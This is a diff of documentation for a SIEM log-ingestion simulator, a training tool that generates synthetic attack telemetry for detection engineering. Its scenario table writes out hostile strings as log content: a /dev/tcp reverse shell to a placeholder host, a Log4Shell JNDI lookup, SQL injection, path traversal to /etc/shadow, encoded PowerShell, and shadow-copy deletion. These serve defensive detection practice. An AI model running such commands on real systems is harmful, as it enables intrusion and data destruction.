@@ -1,4 +1,4 @@
-# APEX_JediSyslogger — Technical Documentation
+# APEX JediSyslogger — Technical Documentation
 
 A browser-based **SIEM log-ingestion simulator** with an optional zero-dependency
 Node backend for real syslog forwarding. This document is the full reference:
@@ -25,7 +25,7 @@ formats, the HTTP API, configuration, and deployment.
 
 ## 1. Overview
 
-APEX_JediSyslogger generates synthetic security telemetry and analyses it in real
+APEX JediSyslogger generates synthetic security telemetry and analyses it in real
 time, so you can practise **detection engineering** without a live environment. It
 has two halves:
 
@@ -140,65 +140,116 @@ appliance events always use their native vendor format.
 
 ## 5. Attack scenarios
 
-26 scenarios under **Attack ›**. Each produces a burst of events crafted to trip a
-detection rule, so every button demonstrably lights up the dashboard.
+**26** scenarios live under the **Attack ›** menu. Each scenario's `build()`
+returns a *burst* of event partials crafted to trip a specific detection rule, so
+every button demonstrably lights up the dashboard. A burst can be injected even
+while the baseline generator is stopped, and its events are spread 30–90 ms apart
+so the correlation windows see them as live traffic.
 
-| Scenario | Emits | Fires rule | ATT&CK |
-|----------|-------|------------|--------|
-| SSH Brute Force | `sshd` failed-password burst (+ occasional success) | ssh-bruteforce, brute-success | T1110 / T1078 |
-| Port Scan | firewall DENY across many ports | port-scan | T1046 |
-| SQL Injection | web requests with SQLi payloads | sql-injection | T1190 |
-| C2 Beacon | internal → known-bad IP | c2-beacon | T1071 |
-| Data Exfiltration | large outbound flow | data-exfil | T1048 |
-| DNS Tunneling | long TXT queries to bad domain | dns-tunneling | T1071.004 |
-| Privilege Escalation | `sudo … USER=root` / Win 4672 | priv-esc | T1068 |
-| Malware / IDS Hit | Suricata/ET signature | ids-malware | T1204 |
-| Log4Shell RCE | `${jndi:ldap://…}` in HTTP | web-exploit | T1190 |
-| XSS Injection | `<script>` / `onerror=` in URL | web-exploit | T1059 |
-| Path Traversal / LFI | `../../etc/passwd` | web-exploit | T1083 |
-| Web Shell | POST to `shell.php?cmd=` | web-exploit | T1505.003 |
-| Vuln Scan | many paths, scanner UA (sqlmap/Nikto) | web-exploit | T1595 |
-| Reverse Shell | `bash -i >& /dev/tcp/…` | reverse-shell | T1059 |
-| Malicious PowerShell | `powershell -enc <base64>` (4688) | susp-powershell | T1059.001 |
-| RDP Brute Force | Windows 4625 LogonType 10 burst | windows-threat | T1110 |
-| Password Spray | 4625 across many accounts, one password | windows-threat | T1110.003 |
-| Kerberoasting | 4769 RC4 service-ticket requests | windows-threat | T1558.003 |
-| DCSync | 4662 replication rights | windows-threat | T1003.006 |
-| New Admin Account | 4720 + 4732 (added to Administrators) | windows-threat | T1136 |
-| Audit Log Cleared | 1102 | windows-threat | T1070.001 |
-| Pass-the-Hash | 4624 LogonType 9 / NTLM | windows-threat | T1550.002 |
-| Ransomware | `vssadmin delete shadows`, mass `.locked` | ransomware | T1486 |
-| Cryptomining | DNS + `stratum+tcp://pool` | cryptomining | T1496 |
-| SYN Flood (DDoS) | firewall SYN-flood deny burst | dos-flood | T1498 |
-| Phishing Email | mail log, SPF/DKIM/DMARC fail + risky attachment | phishing | T1566 |
+Scenarios are defined in `js/syslogger.js` in two objects that are merged into a
+single `SCENARIOS` map: the original eight in `SCENARIOS` and the additional
+eighteen in `MORE_ATTACKS`. The **ID** column below is the internal key passed to
+`injectScenario(id)`; it is what the `Attack ›` buttons call.
+
+| ID | Scenario | What the burst emits | Fires rule | ATT&CK |
+|----|----------|----------------------|-----------|--------|
+| `ssh-bruteforce` | SSH Brute Force | 12–20 `sshd` *Failed password* lines from one threat-intel IP; ~30 % of the time a trailing *Accepted password* | `ssh-bruteforce`, `brute-success` | T1110 / T1078 |
+| `port-scan` | Port Scan | 20–30 firewall **DENY** events to distinct dst ports on one internal host | `port-scan` | T1046 |
+| `sql-injection` | SQL Injection | 3–5 nginx requests with SQLi payloads (`' OR '1'='1`, `UNION SELECT`, `; DROP TABLE`, `SLEEP(5)`) | `sql-injection` | T1190 |
+| `c2-beacon` | C2 Beacon | 4–7 firewall **ALLOW** flows from an internal victim to a known-bad IP on 443 / 8443 / 4444 | `c2-beacon` | T1071 |
+| `data-exfil` | Data Exfiltration | one firewall **ALLOW** flow of 220–900 MB outbound | `data-exfil` | T1048 |
+| `dns-tunneling` | DNS Tunneling | 4–8 DNS **TXT** queries with 40–60-char hex labels under a known-bad domain | `dns-tunneling` | T1071.004 |
+| `priv-esc` | Privilege Escalation | a `sudo … USER=root ; COMMAND=/bin/bash` event **plus** a Windows **4672** SeDebugPrivilege event | `priv-esc` | T1068 |
+| `malware-detected` | Malware / IDS Hit | one Suricata alert (Cobalt Strike / Emotet / Log4j / PowerShell EncodedCommand) | `ids-malware` | T1204 |
+| `log4shell` | Log4Shell RCE | 2–3 web requests carrying `${jndi:ldap://<bad-ip>:1389/Exploit}` in the URL / User-Agent | `web-exploit` | T1190 |
+| `xss` | XSS Injection | 2–3 web requests with `<script>` / `onerror=` payloads | `web-exploit` | T1059 |
+| `dir-traversal` | Path Traversal / LFI | 2–3 web requests for `../../../../etc/passwd`, `/etc/shadow`, `win.ini` | `web-exploit` | T1083 |
+| `web-shell` | Web Shell | 2–3 **POST**s to `shell.php?cmd=`, `c99.php`, `webshell.aspx` | `web-exploit` | T1505.003 |
+| `vuln-scan` | Vuln Scan | 5–8 GETs to sensitive paths (`/admin`, `/.git/config`, `/.env`…) with a scanner UA (sqlmap / Nikto / Nessus / Nmap) | `web-exploit` | T1595 |
+| `reverse-shell` | Reverse Shell | one shell event `bash -i >& /dev/tcp/<bad-ip>/4444 0>&1` | `reverse-shell` | T1059 |
+| `powershell-enc` | Malicious PowerShell | Windows **4688** with `powershell -nop -w hidden -enc <base64>` | `susp-powershell` | T1059.001 |
+| `rdp-bruteforce` | RDP Brute Force | 10–16 Windows **4625** LogonType 10 failures from one threat-intel IP | `windows-threat` | T1110 |
+| `password-spray` | Password Spray | **4625** across 10 distinct accounts with one password, from one IP | `windows-threat` | T1110.003 |
+| `kerberoasting` | Kerberoasting | **4769** RC4 (`0x17`) service-ticket requests for 4 service accounts | `windows-threat` | T1558.003 |
+| `dcsync` | DCSync | **4662** with `DS-Replication-Get-Changes-All` replication rights | `windows-threat` | T1003.006 |
+| `new-admin` | New Admin Account | **4720** (account created) **+ 4732** (added to Administrators) | `windows-threat` | T1136 |
+| `log-cleared` | Audit Log Cleared | **1102** security audit log cleared | `windows-threat` | T1070.001 |
+| `pass-the-hash` | Pass-the-Hash | **4624** LogonType 9 / NTLM logon | `windows-threat` | T1550.002 |
+| `ransomware` | Ransomware | **4688** `vssadmin delete shadows` + `bcdedit … recoveryenabled no` + **4663** mass `.locked` rename | `ransomware` | T1486 |
+| `cryptomining` | Cryptomining | DNS query to a mining pool **plus** a firewall flow to `stratum+tcp://<pool>:3333` | `cryptomining` | T1496 |
+| `ddos-synflood` | SYN Flood (DDoS) | 8–12 firewall **DENY** SYN-flood events to one target from spoofed IPs | `dos-flood` | T1498 |
+| `phishing` | Phishing Email | one postfix event, `spf=fail dkim=fail dmarc=fail` + a risky attachment (`.exe/.iso/.js/.docm`) | `phishing` | T1566 |
+
+The known-bad IPs and domains used above come from `THREAT_INTEL` in `js/data.js`
+(e.g. `185.220.101.44`, `kx7z2q-c2.badnet.ru`); the Jedi engine treats them as
+threat-intel matches.
 
 ---
 
 ## 6. Appliance log formats
 
-12 sources under **Appliance logs ›**, each emitting the vendor's **real wire
-format** (still wrapped in a syslog PRI header). Each burst mixes benign traffic
-with one malicious event that trips a detection.
+**12** sources live under the **Appliance logs ›** menu. Each burst mixes 2–5
+benign events with one malicious event, and every event is rendered in the
+vendor's **real wire format** (still wrapped in a syslog `<PRI>` header) by the
+matching formatter in `js/data.js` → `VENDOR_FORMATTERS`. The RFC 3164 / 5424
+toggle does **not** apply — real appliances have fixed formats. The **ID** column
+is the internal key the `Appliance logs ›` buttons pass to `injectScenario(id)`.
 
-| Appliance | Format | Example shape |
-|-----------|--------|---------------|
-| Palo Alto (PAN-OS) | CSV | `1,<time>,<serial>,THREAT,vulnerability,…,tcp,reset-both,"…(91991)",…,critical` |
-| FortiGate (FortiOS) | `key=value` | `date=… time=… devname="FGT60F" type="utm" subtype="ips" action="dropped" attack="…"` |
-| Cisco ASA | `%ASA-level-id` | `%ASA-4-106023: Deny tcp src outside:… dst inside:…` |
-| Check Point | `key=value;` | `product="…"; action="Drop"; src=…; dst=…; rule="…"` |
-| Sophos XG | `key=value` | `device="SFW" log_component="IPS" signature="…" action="Deny"` |
-| pfSense | filterlog CSV | `filterlog[pid]: 5,,,…,em0,match,block,in,4,…,tcp,…,SRC,DST,SPT,DPT` |
-| Juniper SRX | RT_FLOW | `RT_FLOW: RT_FLOW_SESSION_DENY: session denied SRC/SPT->DST/DPT …` |
-| SonicWall | `id/sn key=value` | `id=firewall sn=… m=82 msg="…" src=…:… dst=…:…` |
-| Zscaler ZIA | NSS `key=value` | `zscalernss: … url="…" action="Blocked" threatname="…"` |
-| F5 BIG-IP ASM | `key=value` | `ASM:…,policy_name="…",violations="SQL-Injection",request_status="blocked"` |
-| CEF (generic) | ArcSight CEF | `CEF:0\|Vendor\|Product\|1.0\|SigID\|Name\|Sev\|src=… dst=… act=…` |
-| LEEF (generic) | QRadar LEEF | `LEEF:2.0\|Vendor\|Product\|2.0\|EventID\|<tab-separated key=value>` |
+Two detection paths cover the malicious event in each burst:
 
-Detection of appliance threats is uniform: any event carrying a `threatSig` fires
-the **appliance-threat** rule, which maps the signature text to an ATT&CK
-technique. Firewall-style appliances instead route their malicious event through
-the generic **c2-beacon** rule (internal host → threat-intel IP).
+- Appliances that carry an IPS/WAF **`threatSig`** field (Palo Alto, FortiGate,
+  Sophos, SonicWall, Zscaler, F5, CEF, LEEF) fire the **`appliance-threat`** rule,
+  which maps the signature text to an ATT&CK technique.
+- Pure firewall appliances with no signature field (Cisco ASA, Check Point,
+  pfSense, Juniper) route their malicious event through the generic
+  **`c2-beacon`** rule instead (internal host → threat-intel IP).
+
+| ID | Appliance | Format | Detection | Malicious signature / trigger |
+|----|-----------|--------|-----------|-------------------------------|
+| `paloalto` | Palo Alto (PAN-OS) | CSV | `appliance-threat` | Log4j RCE (91991), SQLi (20568), EternalBlue (40007), Dir Traversal (31337) |
+| `fortigate` | FortiGate (FortiOS) | `key=value` | `appliance-threat` | Log4j (51006), SMB OOB read (41435), Cobalt Strike (46774), SQLi (15621) |
+| `ciscoasa` | Cisco ASA | `%ASA-lvl-id` | `c2-beacon` | outbound *Built* connection to a known-bad IP (+ inbound `106023` Deny) |
+| `checkpoint` | Check Point | `k=v;` | `c2-beacon` | *Accept* to a flagged destination (+ a `Drop`) |
+| `sophos` | Sophos XG | `key=value` | `appliance-threat` | SQL-Injection-Attack, Log4j (CVE-2021-44228), Suspicious-Executable-Download |
+| `pfsense` | pfSense | filterlog CSV | `c2-beacon` | *pass out* to a flagged destination |
+| `juniper` | Juniper SRX | RT_FLOW | `c2-beacon` | RT_FLOW session *created* to a flagged destination |
+| `sonicwall` | SonicWall | `id/sn key=value` | `appliance-threat` | Suspected Port Scan, Possible SYN Flood, Malformed packet |
+| `zscaler` | Zscaler ZIA | NSS `key=value` | `appliance-threat` | Win32.Trojan.Emotet, JS.Downloader.GenericKD, EICAR-Test-File, Phishing.Kit |
+| `f5` | F5 BIG-IP ASM | comma `key=value` | `appliance-threat` | SQL-Injection, XSS, Command-Execution, Predictable-Resource-Location |
+| `cef` | CEF (generic ArcSight) | `CEF:0\|…` | `appliance-threat` | Brute Force Attack, Malware Communication, Data Exfiltration Attempt |
+| `leef` | LEEF (generic QRadar) | `LEEF:2.0\|…` | `appliance-threat` | Port Scan, Suspect Data Loss, Botnet C2 Communication |
+
+### Example wire lines
+
+Representative malicious lines (values such as timestamps, serials, and session
+IDs are randomised at generation time):
+
+**Palo Alto** THREAT (CSV):
+
+```
+<130>Jul 16 10:22:41 PA-3220 1,2026/07/16 10:22:41,012345678901,THREAT,vulnerability,0,2026/07/16 10:22:41,185.220.101.44,10.10.1.11,0.0.0.0,0.0.0.0,untrust-to-dmz,,,web-browsing,vsys1,untrust,dmz,ethernet1/1,ethernet1/2,forward-log,2026/07/16 10:22:41,123456,1,54321,443,0,0,0x0,tcp,reset-both,"Apache Log4j Remote Code Execution Vulnerability(91991)",code-execution,critical,client-to-server
+```
+
+**FortiGate** IPS (`key=value`):
+
+```
+<162>date=2026-07-16 time=10:22:41 devname="FGT60F" devid="FGT12345TK1234567" logid="0419016384" type="utm" subtype="ips" level="critical" vd="root" srcip=185.220.101.44 srcport=51000 dstip=10.10.1.11 dstport=443 proto=6 action="dropped" policyid=12 service="HTTPS" attack="Apache.Log4j.Error.Remote.Code.Execution" attackid=51006 severity="critical" msg="ips dropped …"
+```
+
+**Cisco ASA** inbound deny (`%ASA-lvl-id`):
+
+```
+<164>Jul 16 10:22:41 ASA-5516 : %ASA-4-106023: Deny tcp src outside:185.220.101.44/51000 dst inside:10.10.1.11/3389 by access-group "outside_access_in"
+```
+
+**CEF** (generic ArcSight):
+
+```
+<146>Jul 16 10:22:41 arcsight-conn CEF:0|Security|ThreatManager|1.0|912|Malware Communication|9|src=185.220.101.44 dst=10.10.1.11 spt=51000 dpt=443 proto=TCP act=blocked
+```
+
+Click any appliance event in the live stream to open the drawer and see its full
+raw wire line alongside the parsed fields.
 
 ---
 
@@ -336,7 +387,42 @@ All controls live in the header and the **Source & delivery configuration** bar.
 The app is a static site plus a zero-dependency Node backend. **Requirement on the
 target: Node.js** (no `npm install`).
 
-### Copy the files
+### Prerequisites
+
+- **Node.js 14 or newer** (any current LTS) — provides the `node` runtime for the
+  backend. Verify with `node --version`. Install it from your OS package manager
+  or from <https://nodejs.org>.
+- **git** — only needed if you clone the repo (you can download an archive
+  instead — see below).
+- **Nothing else.** There is no `package.json` and no `npm install` — the backend
+  uses only Node's built-in `http`, `dgram`, `net`, `fs`, and `path` modules.
+
+### Getting the code onto a new machine
+
+**Option A — clone with git:**
+
+```bash
+git clone https://gitlab.supportlab.cloud/alfreddgreat/apex-jedisyslogger.git
+cd apex-jedisyslogger
+```
+
+**Option B — download an archive (no git required):**
+
+```bash
+# tarball of the main branch
+curl -L -o apex.tar.gz \
+  "https://gitlab.supportlab.cloud/alfreddgreat/apex-jedisyslogger/-/archive/main/apex-jedisyslogger-main.tar.gz"
+tar xzf apex.tar.gz
+cd apex-jedisyslogger-main
+```
+
+Or from the GitLab web UI: **Code ▾ → Download source code → zip / tar.gz**, then
+unpack it. Either way you end up with `index.html`, `server.js`, and the `js/`,
+`css/`, `samples/` folders — start it with `node server.js` (see below).
+
+### Copy the files to a remote host
+
+If you already have the project locally and want to push it to a server:
 
 ```bash
 rsync -av --exclude '.git' --exclude 'node_modules' \
@@ -360,7 +446,7 @@ Then browse to `http://172.26.250.20:8099`.
 
 ```ini
 [Unit]
-Description=APEX_JediSyslogger SIEM log simulator
+Description=APEX JediSyslogger SIEM log simulator
 After=network.target
 
 [Service]
@@ -420,3 +506,7 @@ the quickest way to verify coverage.
 | Forwarding foot says "backend not running" | You opened the app statically (python/`file://`). Serve it with `node server.js`. |
 | Port 8099 in use | `PORT=9000 node server.js`. |
 | Nothing happens on Start | Rate slider at 0, or a volume cap already reached — check the volume foot. |
+
+---
+
+Created By: **Alfredo Nacino** · [www.alfredonacino.com](https://www.alfredonacino.com) · alfredo@nacino.net
